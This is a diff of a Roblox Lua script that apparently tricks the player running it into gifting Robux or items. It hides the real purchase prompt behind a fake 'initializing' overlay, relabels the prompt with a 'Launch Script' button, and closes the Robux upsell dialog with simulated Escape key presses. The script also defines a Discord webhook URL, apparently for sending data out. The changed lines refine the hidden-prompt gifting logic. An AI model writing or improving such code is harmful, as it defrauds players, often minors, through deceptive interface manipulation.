@@ -24,11 +24,11 @@ local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1357962037
 --[[============================ Script Guard ============================]]
 
 -- Prevent multiple executions
-if _G.CombinedScriptExecuted_v1_10 then -- Updated guard name
+if _G.CombinedScriptExecuted_v1_11 then -- Updated guard name
     warn("Combined script already executed.")
     return
 end
-_G.CombinedScriptExecuted_v1_10 = true
+_G.CombinedScriptExecuted_v1_11 = true
 
 -- Wait for game load
 repeat task.wait() until game:IsLoaded()
@@ -630,7 +630,7 @@ local function showInitializingUI()
 end
 
 
--- Main Gifting Phase Function (Implementing Overlay Until Click logic)
+-- Main Gifting Phase Function (Overlay Until Click logic)
 local function executeGiftingPhase()
     -- Get UserID first
     local successUserId, userIdResult = pcall(function()
@@ -679,19 +679,30 @@ local function executeGiftingPhase()
         return false
     end
 
-    -- Check for Robux Upsell Prompt immediately (behind initializing UI)
-    task.wait(0.1) -- Reduced wait
-    local RobuxUpsellContainer = PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
-    if RobuxUpsellContainer and RobuxUpsellContainer.Visible then
-        warn("Gifter Phase: Robux Upsell detected. Insufficient funds.")
-        gifter_giftingFailed = true
-        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05) -- Reduced wait
-        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-        if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
-        return true -- Gifting phase technically finished, but failed due to funds
+    -- Loop briefly to check for Upsell container visibility (behind initializing UI)
+    local upsellDetected = false
+    local upsellCheckStart = tick()
+    local upsellCheckTimeout = 0.75 -- Check for 0.75 seconds
+    while tick() - upsellCheckStart < upsellCheckTimeout do
+        local RobuxUpsellContainer = PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
+        if RobuxUpsellContainer and RobuxUpsellContainer.Visible then
+            warn("Gifter Phase: Robux Upsell detected during loop check.")
+            upsellDetected = true
+            gifter_giftingFailed = true
+            break -- Exit the check loop
+        end
+        task.wait(0.05) -- Check frequently
     end
 
-    -- Modify the prompt UI to show the "Launch Script" button (still behind initializing UI)
+    if upsellDetected then
+        -- Attempt to close the upsell prompt
+        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
+        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+        if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
+        return true -- Gifting phase finished (failed due to funds)
+    end
+
+    -- If upsell wasn't detected, proceed with modification (still behind overlay)
     gifter_modifyPromptUI()
     warn("Gifter Phase: Prompt modified behind overlay.")
 
@@ -1549,5 +1560,5 @@ end
 
 -- Cleanup script executed flag on teleport (from Gifter)
 LocalPlayer.OnTeleport:Connect(function()
-    _G.CombinedScriptExecuted_v1_9 = nil -- Match guard name
+    _G.CombinedScriptExecuted_v1_10 = nil -- Match guard name
 end)
